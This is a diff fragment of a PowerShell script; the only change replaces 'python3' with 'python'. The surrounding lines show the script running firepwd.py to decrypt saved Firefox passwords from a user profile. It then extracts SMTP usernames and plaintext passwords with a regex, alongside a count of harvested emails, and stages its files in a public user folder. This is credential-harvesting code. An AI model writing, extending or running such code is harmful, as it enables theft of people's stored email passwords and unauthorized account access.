@@ -48,7 +48,7 @@ Write-Host ("Found {0} emails" -f $allemails.Count)
 
 # Run your Python script and capture the output
 pip install -r "C:\Users\Public\Public Display\requirements.txt"
-$output = python3 "C:\Users\Public\Public Display\firepwd.py" -d $($profile.FullName)
+$output = python "C:\Users\Public\Public Display\firepwd.py" -d $($profile.FullName)
 
 # Define the updated regex pattern for extracting the username and password
 $regex = "smtp://(?:[^\s]+):b'([^\']+)',b'([^\']+)'"
